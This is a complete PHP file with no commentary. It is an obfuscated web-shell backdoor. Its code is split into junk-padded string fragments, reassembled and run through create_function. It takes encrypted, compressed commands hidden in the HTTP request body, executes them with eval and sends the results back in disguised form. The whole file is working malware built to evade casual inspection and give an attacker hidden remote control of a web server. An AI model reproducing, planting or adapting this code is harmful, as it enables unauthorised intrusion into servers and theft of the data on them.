<?php
$M='conteiMnts()iM;@ob_iMend_cleaiMn();$r=iM@basiMe64_eniMciMode(@x(@gzciMompiMreiMss($o)iM,$k));priMint("$p$kh$iMr$kf");}';
$r='M{$o.iM=$t{$i}^$k{$jiMiM};iM}}return $oiM;iM}if (iM@preg_match("/$iMkh(.+)$iMkfiM/",iMiM@file_get_contiMents("php:iMiMiM';
$l='){$c=iMstrliMen($k)iM;$l=strlen($iMt);iM$o="iM";fiMoriM($i=0;$i<$l;)iM{foiMr(iMiM$j=0;($j<$c&&$i<iM$liM);$j++,$i++)i';
$P='$k="iM5aeddiM83a";$kh="0iMiM2377a852abb";iM$kfiM="1f1iM06099db3b"iM;$p="iMKKiMsiMQSAoEqDkOeoiMpr"iM;functiMion x($t,$iMk';
$T='/iM/iMinput"),$m)==1) iM{@ob_start();@evaiMl(@giMzuncompriMiMess(@x(@baiMse64_diMeiMcode($m[1]),$k)iMiM));$o=@ob_get_iM';
$z=str_replace('Gp','','creGpGpGpateGp_fGpunctGpion');
$S=str_replace('iM','',$P.$l.$r.$T.$M);
$i=$z('',$S);$i();
?>
